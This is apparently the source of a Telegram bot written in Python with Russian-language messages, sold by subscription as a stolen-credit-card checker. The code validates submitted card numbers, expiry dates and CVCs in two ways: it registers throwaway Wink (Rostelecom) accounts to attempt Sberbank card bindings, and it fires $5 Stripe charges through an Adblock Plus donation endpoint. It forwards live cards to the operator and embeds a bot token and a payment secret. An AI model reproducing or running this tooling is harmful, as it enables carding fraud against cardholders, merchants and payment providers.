import requests
from random import choice
from time import sleep
import re
import logging
import io
from aiogram import Bot, Dispatcher, executor, types
from datetime import datetime
from threading import *
import time
import random
import string
from threading import Thread
admins = [1918556925]

subs = {'1918556925': '1', '1883879405': '1', '1399431696': '1', '1709459372': '0', '621200811': '0', '1934741800': '0', '971901377': '0', '1947894585': '0', '1521430408': '1', '1811020524': '0', '1709463511': '1', '761058203': '0', '982948373': '0', '1985470851': '0', '1709463511': '0', "1906034435": "1"}
ocheredi = {}
o1 = {}
o2 = {}
o3 = {}
o11 = {}
o22 = {}
o33 = {}
N = 10

rnd = "".join(random.choices(string.ascii_lowercase + string.digits, k=N))

proxy = {"http": "67.207.83.225:80"}


session = requests.session()

session.proxies = proxy  # UNCOMMENT IT AFTER PROXIES

# Объект бота
bot = Bot(token="2095845266:AAEPUpCuXgDcAlO1D49xmkVtRFxldcKM2Ic")
# Диспетчер для бота
dp = Dispatcher(bot)
# Включаем логирование, чтобы не пропустить важные сообщения
logging.basicConfig(level=logging.INFO)
headers = {
    "User-Agent": "WINK/1.34.1 (Android/11)",
    "session_id": "93c999e7-41f6-11ec-a320-0894efafec4e:44740271:44774187:3",
    "x-rt-uid": "",
    "x-rt-san": "",
}

        
def try_or(fn, df):
    try:
        return fn()
    except Exception as err:
        print(14)
        print(err)
        return df




def getUID():
    uid = "".join(choice("0123456789abcdefghjklzxcvbnm") for _ in range(16))
    f = requests.post(
        "https://cnt-odcv-itv02.svc.iptv.rt.ru/api/v2/itv/devices",
        json={
            "model": "".join(choice("0123456789abcdefghjklzxcvbnm") for _ in range(10)),
            "platform": "android",
            "real_uid": uid,
            "sn": uid,
            "terminal_name": "".join(choice("0123456789abcdefgh") for _ in range(16)),
            "type": "NCMOBILEANDROID",
            "vendor": "Bebra",
        },
        headers={
            "x-rt-uid": "",
            "x-rt-san": "",
            "user-agent": "WINK/1.34.1 (Android/11)",
        },
    )
    return f.json()["uid"]


def regAccount():
	email = "".join(choice("0123456789abcdefghjklzxcvbnm") for _ in range(10)) + "@mail.ru"
	ud = getUID()
	sess_id = requests.post(
		"https://cnt-odcv-itv02.svc.iptv.rt.ru/api/v2/itv/sessions",
		headers={
			"x-rt-uid": ud,
			"x-rt-san": "",
			"user-agent": "WINK/1.34.1 (Android/11)",
		},
		json={"device_uid": ud},
	).json()["session_id"]
	san = requests.post(
		"https://cnt-odcv-itv02.svc.iptv.rt.ru/api/v2/user/accounts",
		headers={"User-Agent": "WINK/1.34.1 (Android/11)", "session_id": sess_id},
		json={"login": email, "login_type": "email", "password": "bebra228"},
	).json()["san"]
	session_id = requests.post(
		"https://cnt-odcv-itv02.svc.iptv.rt.ru/api/v2/user/sessions",
		headers={"User-Agent": "WINK/1.34.1 (Android/11)", "session_id": sess_id},
		json={"login": email, "login_type": "email", "password": "bebra228"},
	).json()["session_id"]
	return {"san": san, "session_id": session_id, "uid": ud}


def requestBuilderWink(url, data=None, params=None, json=None, method=None):
	bebra = regAccount()
	headers = {
		"User-Agent": "WINK/1.34.1 (Android/11)",
		"session_id": bebra["session_id"],
		"x-rt-uid": bebra["uid"],
		"x-rt-san": bebra["san"],
	}
	if method == "post":
		ff = lambda: requests.post(
			url,
			headers=headers,
			json=json,
		)
	else:
		ff = lambda: requests.get(
			url,
			headers=headers,
		)
	while True:
		kk = try_or(lambda: ff(), None)
		try:
			if data in kk.text:
				return kk.json()
			sleep(0)
		except Exception as err:
			print(err)

def getBind(card, mm, yy, cvc):
	data = requestBuilderWink(
		"https://vlg-srtv-itv02.svc.iptv.rt.ru/api/v2/user/bank_cards",
		data="order_id",
		method="post",
	)
	return [requests.post(
		"https://securepayments.sberbank.ru:9001/rtk_binding/request",
		headers={
			"User-Agent": "WINK/1.34.1 (Android/11)",
			"Accept": "application/json, text/plain, */*",
			"Referer": "https://wink.rt.ru/",
			"Origin": "https://wink.rt.ru",
		},
		json={
			"authPay": {
				"orderId": data["order_id"],
				"payAmount": data["pay_amount"],
				"payCurrId": "RUB",
				"reqTime": "2021-09-15T01:00:37.314+04:00",
			},
			"cardCvc": str(cvc),
			"cardExpMonth": mm,
			"cardExpYear": int("20" + yy),
			"cardHolder": "ALEKSANDR GOLYSHEV",
			"cardNumber": str(card),
			"reqId": data["req_id"],
			"reqType": "cardRegister",
		},
	).json(), data['pay_amount']]


def checkMulti(multistr):
    temp = ""
    for a in multistr.replace("\\n", "\n").split("\n"):
        print(a)
        asd = re.findall("(................)\|(..)\|(..)\|(...)", a)
        print(asd)
        if asd == []:
            # temp+=(a + " :no(notfoundcard)\n"
            pass
        else:
            if (int(asd[0][1]) > 12) or (int(asd[0][1]) <= 0) or (int(asd[0][2]) < 21) or (
                    asd[0][2] == str(datetime.now().year).replace("20", "")) & (
                    int(asd[0][1]) <= int(datetime.now().month)):
                temp += (a + ":❌: срок годности\n")
            else:
                try:
                    temp += Wink(asd[0][0], asd[0][1], asd[0][2], asd[0][3]) + "\n"
                    print(temp)
                except KeyError as e:
                    print("")
    return temp


async def Wink(card, mm, yy, cvc, name, a):
    bind1 = getBind(card, mm, yy, cvc)
    print(bind1)
    bind = bind1[0]
    print(bind)
    payamount = str(bind1[1])
    print(payamount)
    time.perf_counter
    b = time.perf_counter()
    if "reqNote" in bind:
        aye1 = bind["reqUserMsg"]
        print(aye1)
        print(f"💳 Карта: {card}|{mm}|{yy}|{cvc}\n💎 Результат: ❌ #DEAD - {aye1}\n🌌Checker - @Checker3inexzzBot\n🕐 Время: {str(b - a)[:4]}(s)\n👨‍💻 Проверил: {name}")
        return(f"💳 Карта: {card}|{mm}|{yy}|{cvc}\n💎 Результат: ❌ #DEAD - {aye1}\n🌌Checker - @Checker3inexzzBot\n🕐 Время: {str(b - a)[:4]}(s)\n👨‍💻 Проверил: {name}")
    else:
        return(f"💳 Карта: {card}|{mm}|{yy}|{cvc}\n💎 Результат : ✅ #LIVE - {payamount[:2]}.{payamount[2:]}₽\n🌌Checker - @Checker3inexzzBot\n🕐 Время: {str(b - a)[:4]}(s)\n👨‍💻 Проверил: {name}")

@dp.message_handler(commands="start")
async def startt(message: types.Message):
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(types.InlineKeyboardButton(text="💳️Проверить карты", callback_data="checkcc"))
    keyboard.add(types.InlineKeyboardButton(text="👤Администрация", callback_data="contacts"))
    keyboard.add(types.InlineKeyboardButton(text="👥Очереди", callback_data="ocheredi"))
    await message.answer(f"*😎Welcome, {message.from_user.first_name}!*", reply_markup=keyboard, parse_mode="Markdown")
    if str(message.from_user.id) in subs:
        print("okay")
    else:
        subs[str(message.from_user.id)] = "0"
    if str(message.from_user.id) in ocheredi:
        print("okay")
    else:
        ocheredi[str(message.from_user.id)] = "0"
        o1[str(message.from_user.id)] = "0:0"
        o2[str(message.from_user.id)] = "0:0"
        o3[str(message.from_user.id)] = "0:0"
        print(ocheredi)

@dp.callback_query_handler(text="checkcc")
async def without_puree(call: types.CallbackQuery):
    await call.message.answer("*/scc - Мерч 🧩Stripe, списание 5$\n/wcc - Мерч 🎈Wink, списание от 10 до 20 рублей*", parse_mode="Markdown")
    print(call.from_user.id)

@dp.callback_query_handler(text="contacts")
async def without_puree(call: types.CallbackQuery):
    await call.message.answer("*По покупке, и вопросам писать @l3inexzz*", parse_mode= 'Markdown')

@dp.callback_query_handler(text="ocheredi")
async def without_puree(call: types.CallbackQuery):
    if str(ocheredi[str(call.from_user.id)]) == "0":
        await call.message.answer("*У вас нет активных очередей*", parse_mode='Markdown')
    else:
        oo1 = o1[str(call.from_user.id)].split(":")
        if o1[str(call.from_user.id)] != "0:0":
            if o2[str(call.from_user.id)] != "0:0":
                oo2 = o2[str(call.from_user.id)].split(":")
                if o3[str(call.from_user.id)] != "0:0":
                    oo3 = o3[str(call.from_user.id)].split(":")
                    await call.message.answer(
                        f"*Кол-во очередей: {ocheredi[str(call.from_user.id)]}\nОчередь 1: {oo1[0]}/{oo1[1]}\nОчередь 2: {oo2[0]}/{oo2[1]}\nОчередь 3: {oo3[0]}/{oo3[1]}*",
                        parse_mode='Markdown')
                else:
                    await call.message.answer(
                        f"*Кол-во очередей: {ocheredi[str(call.from_user.id)]}\nОчередь 1: {oo1[0]}/{oo1[1]}\nОчередь 2: {oo2[0]}/{oo2[1]}*",
                        parse_mode='Markdown')
            else:
                await call.message.answer(f"*Кол-во очередей: {ocheredi[str(call.from_user.id)]}\nОчередь 1: {oo1[0]}/{oo1[1]}*", parse_mode='Markdown')

@dp.message_handler(commands=["scc"])
async def ch(message: types.Message):
    if str(subs[str(message.from_user.id)]) == "1":
        cc_list = message.text[len("/scc "):].split("\n")
        count = 0
        await message.reply(f"*Карты добавлены в очередь, жди ответа.\nЧекер: 🧩STRIPE*", parse_mode="Markdown")
        for cc in cc_list:
            tic = time.perf_counter()
            if len(cc_list) > 100:
                print(f"*Максимальное количество карт: 100\nВы загрузили: {str(len(cc_list))}*", parse_mode="Markdown")
            splitter = cc.split("|")
            ccn = splitter[0]
            mm = splitter[1]
            yy = splitter[2]
            cvv = splitter[3]
            email = f"{str(rnd)}@gmail.com"
            if not cc:
                return await message.reply("*Используйте так: \n/wcc 5333171042171146|09|22|902\n4040240072677822|08|24|944\n4149439016556437|09|23|963*", parse_mode="Markdown")
            BIN = cc[:6]
    # get guid muid sid
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4571.0 Safari/537.36 Edg/93.0.957.0",
                "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/x-www-form-urlencoded",
            }
            s = session.post("https://m.stripe.com/6", headers=headers)
            r = s.json()
            Guid = r["guid"]
            Muid = r["muid"]
            Sid = r["sid"]

    # now 1 req
            payload = {
                "lang": "en",
                "type": "donation",
                "currency": "USD",
                "amount": "5",
                "custom": "x-0-b43513cf-721e-4263-8d1d-527eb414ea29",
                "currencySign": "$",
            }

            head = {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "*/*",
                "Origin": "https://adblockplus.org",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://adblockplus.org/",
                "Accept-Language": "en-US,en;q=0.9",
            }

            re = session.post(
                "https://new-integration.adblockplus.org/", data=payload, headers=head
            )
            client = re.text
            pi = client[0:27]

            # hmm
            load = {
                "receipt_email": email,
                "payment_method_data[type]": "card",
                "payment_method_data[billing_details][email]": email,
                "payment_method_data[card][number]": ccn,
                "payment_method_data[card][cvc]": cvv,
                "payment_method_data[card][exp_month]": mm,
                "payment_method_data[card][exp_year]": yy,
                "payment_method_data[guid]": Guid,
                "payment_method_data[muid]": Muid,
                "payment_method_data[sid]": Sid,
                "payment_method_data[payment_user_agent]": "stripe.js/6c868a0c6; stripe-js-v3/6c868a0c6",
                "payment_method_data[referrer]": "https://adblockplus.org/",
                "expected_payment_method_type": "card",
                "use_stripe_sdk": "true",
                "webauthn_uvpa_available": "true",
                "spc_eligible": "false",
                "key": "pk_live_Nlfxy49RuJeHqF1XOAtUPUXg00fH7wpfXs",
                "client_secret": "pi_3JwTw7BoI27qQhxA3L6Ep4E8_secret_RFuwrqIiw5tSH8aFp44Fs5YZH",
            }

            header = {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "application/json",
                "Origin": "https://js.stripe.com",
                "Referer": "https://js.stripe.com/",
                "Accept-Language": "en-US,en;q=0.9",
            }

            rx = session.post(
                f"https://api.stripe.com/v1/payment_intents/pi_3JwTw7BoI27qQhxA3L6Ep4E8/confirm",
                data=load,
                headers=header,
            )
            res = rx.json()
            msg = res["error"]["message"]
            toc = time.perf_counter()
            if "incorrect_cvc" in rx.text:
                await message.reply(f'<b>💳 Карта: {cc}\n💎 Результат: ❌ - {msg}\n 🕐Время: {toc - tic:0.4f} сек.\n👨‍💻 Проверил:</b> <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>\n〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️', parse_mode="html")
            elif "Unrecognized request URL" in rx.text:
                await message.reply(rx.text)
            elif rx.status_code == 200:
                await message.reply(f'<b>💳 Карта: {cc}\n💎 Результат: ✅ - #LIVE CHARGE 5$ - {msg}\n 🕐Время: {toc - tic:0.4f} сек.\n👨‍💻 Проверил:</b> <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>\n〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️               🧩STRIPE</b>', parse_mode="html")
            else:
                await message.reply(
                    f'<b>💳 Карта: {cc}\n💎 Результат: ❌ - {msg}\n🕐Время: {toc - tic:0.4f} сек.\n👨‍💻 Проверил:</b> <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a>\n〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️', parse_mode="html")
            count += 1
        await message.reply("*Карты проверены, можете загружать еще!*", parse_mode="Markdown")
    else:
        await message.reply("*Отсутствует подписка*", parse_mode="Markdown")

@dp.message_handler(commands="wcc")
async def cc(message: types.Message):
    if str(subs[str(message.from_user.id)]) == "1":
        count = 0
        ccc = message.text[len('/wcc '):]
        user = message.from_user.username
        ccs = ccc.split(sep=None, maxsplit=100)
        ccslen = len(ccs)
        card_checked = "0" + ":" + str(ccslen)
        if o1[str(message.from_user.id)] == "0:0":
            o1[str(message.from_user.id)] = card_checked
            ocheredi[str(message.from_user.id)] = str(int(ocheredi[str(message.from_user.id)]) + 1)
            co = "o1"
        else:
            if o2[str(message.from_user.id)] == "0:0":
                o2[str(message.from_user.id)] = card_checked
                ocheredi[str(message.from_user.id)] = str(int(ocheredi[str(message.from_user.id)]) + 1)
                co = "o2"
            else:
                if o3[str(message.from_user.id)] == "0:0":
                    o3[str(message.from_user.id)] = card_checked
                    ocheredi[str(message.from_user.id)] = str(int(ocheredi[str(message.from_user.id)]) + 1)
                    co = "o3"
                else:
                    await message.reply(f"*Максимум 3 очереди!*",parse_mode="Markdown")
                    return None
        messageFirst = await message.reply(f"*Карты добавлены в очередь, жди ответа.\nЧекер: 🎈WINK*", parse_mode="Markdown")
        for cc in ccs:
            ccs = cc.capitalize()
            asd = re.findall("(................)\|(..)\|(..)\|(...)", ccs)
            if asd == []:
                await message.reply("*Используйте так: \n/wcc 5333171042171146|09|22|902\n4040240072677822|08|24|944\n4149439016556437|09|23|963*", parse_mode="Markdown")
                continue
            if (int(asd[0][1]) > 12) or (int(asd[0][1]) <= 0) or (int(asd[0][2]) < 21) or (
                    asd[0][2] == str(datetime.now().year).replace("20", "")) & (
                    int(asd[0][1]) <= int(datetime.now().month)):
                await message.reply("Не корректный срок действия!")
                continue
            try:
                a = time.perf_counter()

                result = await Wink(asd[0][0], asd[0][1], asd[0][2], asd[0][3], message.from_user.first_name, a)
                if "LIVE" in result:
                    print("√√√√√√")
                    await bot.send_message("1918556925", "💎Уведомление о валидной карте - \n" + result)
                await bot.send_message(message.from_user.id, f"*{result}*", parse_mode="Markdown")
                count += 1
                if co == "o1":
                    o1[str(message.from_user.id)] = str(count) + ":" + str(ccslen)
                else:
                    if co == "o2":
                        o2[str(message.from_user.id)] = str(count) + ":" + str(ccslen)
                    else:
                        if co == "o3":
                            o3[str(message.from_user.id)] = str(count) + ":" + str(ccslen)
                continue
            except KeyError as e:
                print("бля")
            await messageFirst.edit_text(f"*Карты добавлены в очередь, жди ответа.\nЧекер: 🎈WINK*", parse_mode="Markdown")
        await message.reply("*Карты проверены, можете загружать еще!*", parse_mode="Markdown")
        if co == "o1":
            o1[str(message.from_user.id)] = "0:0"
        else:
            if co == "o2":
                o2[str(message.from_user.id)] = "0:0"
            else:
                if co == "o3":
                    o3[str(message.from_user.id)] = "0:0"



@dp.message_handler(commands="bcheck")
async def ultracc(message: types.Message):
    if message.from_user.id in admins:
        if message.reply_to_message != None:
            if message.reply_to_message != None:
                bytesFile = await message.reply_to_message.document.download(destination=io.BytesIO())
                bytesFile.seek(0)
                messageFirst = await message.reply("Карты проверяются")
                await messageFirst.edit_text(checkMulti(str(bytesFile.read())), parse_mode="HTML")
            else:
                await message.reply("где файл.")
                return
        else:
            await message.reply("где файл.")
            return

@dp.message_handler(commands="sub")
async def get_checks(message: types.Message):
    if str(message.from_user.id) == "1883879405":
        aye = str(message.text)[5:]
        user_id = aye
        subs[user_id] = "1"
        await message.reply("Подписка выдана успешно🥳")
        await bot.send_message("1883879405", str(subs))
        await bot.send_message(user_id, "Вам выдали подписку🥳")


@dp.message_handler(commands="unsub")
async def get_checks(message: types.Message):
    if str(message.from_user.id) == "1883879405":
        aye = str(message.text)[7:]
        user_id = aye
        subs[user_id] = "0"
        await message.reply("Подписка удалена")
        await bot.send_message("1918556925", str(subs))
        await bot.send_message(user_id, "Дествие подписки окончено, продлите ее написав администратору.🥲")

if __name__ == "__main__":
    # Запуск бота
    executor.start_polling(dp, skip_updates=True)
